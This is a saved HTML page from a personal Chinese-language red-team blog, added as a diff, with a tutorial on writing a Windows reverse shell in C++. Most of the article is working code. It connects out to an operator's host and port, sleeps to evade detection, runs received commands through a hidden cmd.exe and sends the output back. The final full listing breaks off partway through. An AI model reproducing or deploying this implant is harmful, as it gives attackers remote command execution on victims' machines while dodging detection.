@@ -1,0 +1,1398 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="一个始终不被善待的人，最能识别善良，也最珍惜善良。 ——《芳华》  文章首发合天智汇，博客备份一个">
+<meta name="keywords" content="c++">
+<meta property="og:type" content="article">
+<meta property="og:title" content="自己编写反弹shell代码">
+<meta property="og:url" content="https://lengjibo.github.io/cshell/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="一个始终不被善待的人，最能识别善良，也最珍惜善良。 ——《芳华》  文章首发合天智汇，博客备份一个">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbibolh4lwj30c8052jr5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbibotk9ovj30hn08rtak.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1gbibrosixfj310r0o276k.jpg">
+<meta property="og:updated_time" content="2020-02-21T02:55:06.707Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="自己编写反弹shell代码">
+<meta name="twitter:description" content="一个始终不被善待的人，最能识别善良，也最珍惜善良。 ——《芳华》  文章首发合天智汇，博客备份一个">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gbibolh4lwj30c8052jr5.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/cshell/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>自己编写反弹shell代码 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/cshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">自己编写反弹shell代码
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-02-21 10:17:03 / Modified: 10:55:06" itemprop="dateCreated datePublished" datetime="2020-02-21T10:17:03+08:00">2020-02-21</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>一个始终不被善待的人，最能识别善良，也最珍惜善良。</p>
+<p>——《芳华》</p>
+<hr>
+<p>文章首发合天智汇，博客备份一个</p>
+<a id="more"></a>
+<p>包含的库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;ws2tcpip.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#pragma comment(lib, &quot;Ws2_32.lib&quot;)</span><br><span class="line">#define DEFAULT_BUFLEN 1024</span><br></pre></td></tr></table></figure>
+<p>winsock2和ws2tcpip两个库文件是用来初始化网络套接字的。windows用来初始化一些windows下的函数，string方便我们后面的一些字符串转换，iostream则是标准的c++头文件，#pragma comment（lib，“Ws2_32.lib”）用来指定编译器使用静态编译该库文件，防止其他环境下无法正常运行我们的文件。1024为给socket的recv和send函数定义缓冲区长度。</p>
+<p>我们定义一个函数和一个主函数,反向shell的函数RunShell,两个参数，一个是我们的host一个是ip。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int RunShell(char *host, int port)｛</span><br><span class="line"></span><br><span class="line">｝</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中的argc为调用的参数的个数，argv为具体的值。这里稍微要注意一下，在接受参数的时候，默认的第一个参数是文件的路径名，所以，我们在接下来的传参的过程中，需要将argv[1]、argv[2]传递给我们的RunShell。</p>
+<p>下面我们来编写我们的RunShell函数，为了避免中间有断开之类的情况，我们使用一个while循环进行一直监听，然后监听之前进行一些休眠，可以绕过部分检测,代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">while (true)</span><br><span class="line">&#123;</span><br><span class="line">	Sleep(5000);//进行休眠，可过一些检测</span><br><span class="line">	SOCKET ShellSock;</span><br><span class="line">	sockaddr_in C2addr;//定义sock初始化需要的变量</span><br><span class="line">	WSADATA Sockver = &#123; 0 &#125;;//定义并初始化一个LPWSADATA的指针</span><br><span class="line">	WSAStartup(MAKEWORD(2, 2), &amp;Sockver);//初始化socket</span><br><span class="line">	ShellSock = socket(</span><br><span class="line">		AF_INET, //地址描述</span><br><span class="line">		SOCK_STREAM, //套接字类型</span><br><span class="line">		IPPROTO_TCP //协议类型</span><br><span class="line">	);</span><br><span class="line">	C2addr.sin_family = AF_INET;</span><br><span class="line">	C2addr.sin_addr.S_un.S_addr = inet_addr(host);//转化Ip地址</span><br><span class="line">	C2addr.sin_port = htons(port);//转换端口</span><br><span class="line">	if (WSAConnect(ShellSock, (SOCKADDR*)&amp;C2addr, sizeof(C2addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) &#123;</span><br><span class="line">		closesocket(ShellSock);</span><br><span class="line">		WSACleanup();//关闭套接字</span><br><span class="line">		continue;</span><br><span class="line">	&#125; //连接目标</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>基本上都已经给出来了注释，都是windows的api，具体的作用就是用来声明一个socket套接字，然后跟目标进行连接，如果失败，则跳出本次循环，继续发出请求。</p>
+<p>具体的用法，可以查看微软官方的文档：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.microsoft.com/zh-cn/windows/win32/api/winsock2/nf-winsock2-wsaconnect</span><br></pre></td></tr></table></figure>
+<p>我们继续，接下来我们来编写我们的接收函数，并进行处理。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char RecvData[DEFAULT_BUFLEN];</span><br><span class="line">memset(RecvData, 0, sizeof(RecvData));//将RecvData清0</span><br><span class="line">int RecvCode = recv(ShellSock, RecvData, DEFAULT_BUFLEN, 0);//接收数据</span><br><span class="line">if (RecvCode&lt;=0) &#123;</span><br><span class="line">	closesocket(ShellSock);</span><br><span class="line">	WSACleanup();</span><br><span class="line">	continue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后我们定义一个数组来存放我们接收的数据，并使用memset将其清0,保证数据的准确性，因为recv如果错误的返回值是0或者负数，所以我们进行一个简单的判断，小于等于0时做跟前面相同的操作。</p>
+<p>具体函数的用法参考：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.microsoft.com/zh-cn/windows/win32/api/winsock/nf-winsock-recv</span><br></pre></td></tr></table></figure>
+<p>假如此时我们已经跟主机建立了连接，也成功接受到了数据，我们就应该将我们接收到的数据进行执行，并但返回给我们的主机。</p>
+<p>主要思路就是调用CreateProcessA函数函数，去处理我们接收的值，然后启动一个cmd进程处理并返回。</p>
+<p>我们先来看一下CreateProcessA的用法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL CreateProcessA(</span><br><span class="line">  LPCSTR                lpApplicationName,</span><br><span class="line">  LPSTR                 lpCommandLine,</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">  BOOL                  bInheritHandles,</span><br><span class="line">  DWORD                 dwCreationFlags,</span><br><span class="line">  LPVOID                lpEnvironment,</span><br><span class="line">  LPCSTR                lpCurrentDirectory,</span><br><span class="line">  LPSTARTUPINFOA        lpStartupInfo,</span><br><span class="line">  LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>其他的都好说，主要是后两个参数，STARTUPINFOA 和PROCESS_INFORMATION的指针，他们的定义为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PROCESS_INFORMATION &#123;</span><br><span class="line">  HANDLE hProcess;</span><br><span class="line">  HANDLE hThread;</span><br><span class="line">  DWORD  dwProcessId;</span><br><span class="line">  DWORD  dwThreadId;</span><br><span class="line">&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _STARTUPINFOA &#123;</span><br><span class="line">  DWORD  cb;</span><br><span class="line">  LPSTR  lpReserved;</span><br><span class="line">  LPSTR  lpDesktop;</span><br><span class="line">  LPSTR  lpTitle;</span><br><span class="line">  DWORD  dwX;</span><br><span class="line">  DWORD  dwY;</span><br><span class="line">  DWORD  dwXSize;</span><br><span class="line">  DWORD  dwYSize;</span><br><span class="line">  DWORD  dwXCountChars;</span><br><span class="line">  DWORD  dwYCountChars;</span><br><span class="line">  DWORD  dwFillAttribute;</span><br><span class="line">  DWORD  dwFlags;</span><br><span class="line">  WORD   wShowWindow;</span><br><span class="line">  WORD   cbReserved2;</span><br><span class="line">  LPBYTE lpReserved2;</span><br><span class="line">  HANDLE hStdInput;</span><br><span class="line">  HANDLE hStdOutput;</span><br><span class="line">  HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFOA, *LPSTARTUPINFOA;</span><br></pre></td></tr></table></figure>
+<p>既然需要我们就定义这样的两个指针，然后再来调用我们的函数。</p>
+<ul>
+<li>pApplicationName<br>指向一个NULL结尾的、用来指定可执行模块的字符串。这个参数可以被设为NULL，在这种情况下，可执行模块的名字必须处于 lpCommandLine 参数最前面并由空格符与后面的字符分开。</li>
+<li>lpCommandLine<br>指向一个以NULL结尾的字符串，该字符串指定要执行的命令行。这个参数可以为空，那么函数将使用lpApplicationName参数指定的字符串当做要运行的程序的命令行。如果lpApplicationName和lpCommandLine参数都不为空，那么lpApplicationName参数指定将要被运行的模块，lpCommandLine参数指定将被运行的模块的命令行。新运行的进程可以使用GetCommandLine函数获得整个命令行。C语言程序可以使用argc和argv参数。</li>
+<li>lpProcessAttributes<br>指向一个SECURITY_ATTRIBUTES结构体，这个结构体决定是否返回的句柄可以被子进程继承。</li>
+<li>lpThreadAttributes<br>同lpProcessAttribute，不过这个参数决定的是线程是否被继承，通常置为NULL。</li>
+<li>bInheritHandles<br>指示新进程是否从调用进程处继承了句柄。如果参数的值为真，调用进程中的每一个可继承的打开句柄都将被子进程继承。被继承的句柄与原进程拥有完全相同的值和访问权限。</li>
+<li>dwCreationFlags<br>指定附加的、用来控制优先类和进程的创建的标志。</li>
+<li>lpEnvironment<br>指向一个新进程的环境块。如果此参数为空，新进程使用调用进程的环境。<br>一个环境块存在于一个由以NULL结尾的字符串组成的块中，这个块也是以NULL结尾的。</li>
+<li>lpCurrentDirectory<br>指向一个以NULL结尾的字符串，这个字符串用来指定子进程的工作路径。这个字符串必须是一个包含驱动器名的绝对路径。如果这个参数为空，新进程将使用与调用进程相同的驱动器和目录。这个选项是一个需要启动应用程序并指定它们的驱动器和工作目录的外壳程序的主要条件。</li>
+<li>lpStartupInfo<br>指向一个用于决定新进程的主窗体如何显示的STARTUPINFO结构体。</li>
+<li><p>lpProcessInformation<br>指向一个用来接收新进程的识别信息的PROCESS_INFORMATION结构体。</p>
+</li>
+<li><p>cb表示包含STARTUPINFO结构中的字节数，应用程序必须将cb初始化为sizeof(STARTUPINFO)。</p>
+</li>
+<li>dwFlags表示结构体启用哪些成员，其中STARTF_USESHOWWINDOW表示使用结构体成员wShowWindow；STARTF_USESTDHANDLES表示使用结构体成员hStdInput、hStdOutput 和 hStdError。</li>
+<li>wShowWindow用于窗口显示方式，SW_HIDE表示隐藏窗口。</li>
+<li>hStdOutput 和 hStdError用于标识控制台窗口的缓存。</li>
+</ul>
+<p>除了这些之外，我们还需要一个管道来获取命令执行后的值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI CreatePipe( </span><br><span class="line">      _Out_PHANDLE hReadPipe, </span><br><span class="line">      _Out_PHANDLE hWritePipe, </span><br><span class="line">      _In_opt_LPSECURITY_ATTRIBUTES lpPipeAttributes,</span><br><span class="line">      _In_DWORD nSize</span><br><span class="line"> );</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hReadPipe = NULL;</span><br><span class="line">HANDLE hWritePipe = NULL;</span><br><span class="line">SECURITY_ATTRIBUTES securityAttributes = &#123; 0 &#125;;</span><br><span class="line">BOOL bRet = FALSE;</span><br><span class="line">STARTUPINFO si = &#123; 0 &#125;;</span><br><span class="line">char command[] = &quot;cmd.exe /c &quot;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; 0 &#125;;</span><br><span class="line">char pszResultBuffer[DEFAULT_BUFLEN];</span><br><span class="line">// 设定管道的安全属性</span><br><span class="line">securityAttributes.bInheritHandle = TRUE;</span><br><span class="line">securityAttributes.nLength = sizeof(securityAttributes);</span><br><span class="line">securityAttributes.lpSecurityDescriptor = NULL;</span><br><span class="line">// 创建匿名管道</span><br><span class="line">bRet = ::CreatePipe(&amp;hReadPipe, &amp;hWritePipe, &amp;securityAttributes, 0);</span><br><span class="line">// 设置新进程参数</span><br><span class="line">si.cb = sizeof(si);</span><br><span class="line">si.hStdError = hWritePipe;</span><br><span class="line">si.hStdOutput = hWritePipe;</span><br><span class="line">si.wShowWindow = SW_HIDE;</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">// 创建新进程执行命令, 将执行结果写入匿名管道中</span><br><span class="line">strcat(command, RecvData);</span><br><span class="line">bRet = ::CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">// 等待命令执行结束</span><br><span class="line">::WaitForSingleObject(pi.hThread, INFINITE);</span><br><span class="line">::WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">// 从匿名管道中读取结果到输出缓冲区</span><br><span class="line">memset(pszResultBuffer, 0, sizeof(pszResultBuffer));</span><br><span class="line">::ReadFile(hReadPipe, pszResultBuffer, DEFAULT_BUFLEN, NULL, NULL);</span><br><span class="line">// 关闭句柄, 释放内存</span><br><span class="line">::CloseHandle(pi.hThread);</span><br><span class="line">::CloseHandle(pi.hProcess);</span><br><span class="line">::CloseHandle(hWritePipe);</span><br><span class="line">::CloseHandle(hReadPipe);</span><br><span class="line">send(ShellSock, pszResultBuffer, DEFAULT_BUFLEN, 0);</span><br></pre></td></tr></table></figure>
+<p>大体的流程就是初始化匿名管道的安全属性结构体SECURITY_ATTRIBUTES调用函数 CreatePipe 创建匿名管道，获取管道数据读取句柄和管道数据写入句柄对即将创建的进程结构体STARTUPINFO进行初始化，设置进程窗口隐藏，并把上面管道数据写入句柄赋值给新进程控制台窗口的缓存句柄，这样，新进程会把窗口缓存的输出数据写入到匿名管道中<br>开始调用 CreateProcess 函数创建新进程，执行 CMD 命令，并调用函数 WaitForSingleObject 等待命令执行完毕，命令执行完毕后，便调用 ReadFile 函数根据匿名管道的数据读取句柄从匿名管道的缓冲区中读取缓冲区的数据，这个数据就是新进程执行命令返回的结果数据，然后将得到的数据发送给我们的服务端。</p>
+<p> 详细的函数说明如下：</p>
+<p> <a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject</a></p>
+<p> <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa</a></p>
+<p> <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information</a></p>
+<p>最后的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;ws2tcpip.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#pragma comment(lib, &quot;Ws2_32.lib&quot;)</span><br><span class="line">#define DEFAULT_BUFLEN 1024</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int RunShell(char *host, int port)</span><br><span class="line">&#123;</span><br><span class="line">	while (true)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(5000);</span><br><span class="line">		SOCKET ShellSock;</span><br><span class="line">		sockaddr_in C2addr;</span><br><span class="line">		WSADATA Sockver = &#123; 0 &#125;;</span><br><span class="line">		WSAStartup(MAKEWORD(2, 2), &amp;Sockver);</span><br><span class="line">		ShellSock = socket(</span><br><span class="line">			AF_INET, </span><br><span class="line">			SOCK_STREAM, </span><br><span class="line">			IPPROTO_TCP </span><br><span class="line">		);</span><br><span class="line">		C2addr.sin_family = AF_INET;</span><br><span class="line">		C2addr.sin_addr.S_un.S_addr = inet_addr(host);</span><br><span class="line">		C2addr.sin_port = htons(port);</span><br><span class="line">		if (WSAConnect(ShellSock, (SOCKADDR*)&amp;C2addr, sizeof(C2addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) &#123;</span><br><span class="line">			closesocket(ShellSock);</span><br><span class="line">			WSACleanup();</span><br><span class="line">			continue;</span><br><span class="line">		